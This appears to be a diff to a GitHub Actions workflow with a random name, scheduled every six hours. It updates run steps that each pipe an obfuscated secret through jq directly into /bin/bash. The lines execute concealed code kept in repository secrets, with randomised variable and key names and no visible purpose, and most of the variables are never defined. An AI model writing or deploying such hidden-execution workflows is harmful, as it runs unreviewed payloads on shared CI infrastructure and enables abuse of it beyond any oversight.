@@ -3,8 +3,9 @@ name: swimmingsardonic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
-jobs:  # 18127
+    - cron: '13 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +13,14 @@ jobs:  # 18127
       - uses: actions/checkout@v4
       - name: swimmingsardonic
         env:
-          f06: ${{ secrets.f06 }}
+          jjj28: ${{ secrets.jjj28 }}
         run: |
-          echo $f06 | jq -r .utlnp758 | /bin/bash
-          echo $mzez3 | jq -r .vve26524 | /bin/bash
-          echo $xjxn8893 | jq -r .gmus07 | /bin/bash
-          echo $ikk6415 | jq -r .mz22 | /bin/bash
-          echo $px393 | jq -r .xpa25 | /bin/bash
-          echo $n896 | jq -r .l05194 | /bin/bash
-          echo $qqyji45371 | jq -r .kgy851 | /bin/bash
-          echo $x9224 | jq -r .egi16490 | /bin/bash
-          echo $h4 | jq -r .t83436 | /bin/bash
+          echo $jjj28 | jq -r .fbi4 | /bin/bash
+          echo $b39230 | jq -r .aov065 | /bin/bash
+          echo $hyhx74 | jq -r .fqoz489 | /bin/bash
+          echo $qofcj313 | jq -r .w01 | /bin/bash
+          echo $tiy690 | jq -r .xipt80 | /bin/bash
+          echo $zttw10 | jq -r .b70403 | /bin/bash
+          echo $ekwe7848 | jq -r .re4011 | /bin/bash
+          echo $yfay307 | jq -r .qa58276 | /bin/bash
 
